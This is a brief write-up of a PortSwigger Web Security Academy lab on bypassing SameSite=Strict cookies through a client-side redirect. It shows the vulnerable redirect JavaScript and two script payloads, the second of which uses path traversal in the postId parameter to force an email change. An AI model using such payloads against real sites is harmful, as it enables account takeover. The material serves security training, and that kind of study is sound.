# [SameSite Strict bypass via client-side redirect](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect)

after a post the site will give a conformation about the posting success on the site `/post/comment/confirmation?postId=x` but after 3 sec it will redirect the user back to the blog post where it uses `js` `setTimeout` for that in the `/resources/js/commentConfirmationRedirect.js` file

confirmation page ->

```
...
<script>redirectOnConfirmation('/post');</script>
...
```

js that redirects from the confirmation page ->

```
redirectOnConfirmation = (blogPath) => {    // /post
  setTimeout(() => {
    const url = new URL(window.location);
    const postId = url.searchParams.get("postId"); // 1
    window.location = blogPath + "/" + postId;
  }, 3000);
};
```

> bypassing it would look like this:

```
<script>
  document.location =
    "https://xxx.web-security-academy.net/post/comment/confirmation?postId=../my-account";
</script>
```

- traversing the the app folder structure

> with `SameSite=Strict` the goal is to run the exploit from the app site

```
<script>
  document.location =
    "https://xxx.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=duck@quack%26submit=1";
</script>
```
